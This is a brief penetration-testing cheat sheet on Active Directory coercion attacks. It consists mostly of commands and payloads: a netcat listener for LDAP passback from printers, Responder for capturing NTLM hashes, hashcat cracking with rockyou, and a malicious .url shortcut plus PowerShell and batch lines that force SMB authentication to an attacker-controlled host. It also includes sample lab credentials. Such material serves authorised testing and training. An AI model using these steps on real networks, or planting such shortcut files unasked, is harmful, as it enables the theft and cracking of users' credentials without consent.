Coersion Attacks

Coercion attacks is to trick a device or user into sending authentication material to an attacker-controlled listener.

LDAP passback​

Printers, scanners, and multifunction peripherals (MFPs) integrate with Active Directory via LDAP.

# start a listener
nc -lvnp 3489

# trigger LDAP connection
# check creds
nxc smb <target> -u '<cn>' -p '<pass>'

File-based​

You need some way to trick the user / service to connect to you.

# change tun0 to the right interface
sudo responder -I tun0

# upload to smb if needed
smbclient //<target>/<share> -U '221b.local\sherlock%Ih4t3moriarty'

# crack it
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force

Icon URLs​

This one don't require interaction. Name the shortcut something like @Test.url so it displays at the top of the directory.

[InternetShortcut]
URL=http://fake.com
WorkingDirectory=/tmp
IconFile=\\<local_ip>\anything
IconIndex=1
EOF

PowerShell​

Test-Path \\<local_ip>\anything

Bat​

@echo off
dir \\<local_ip>\anything
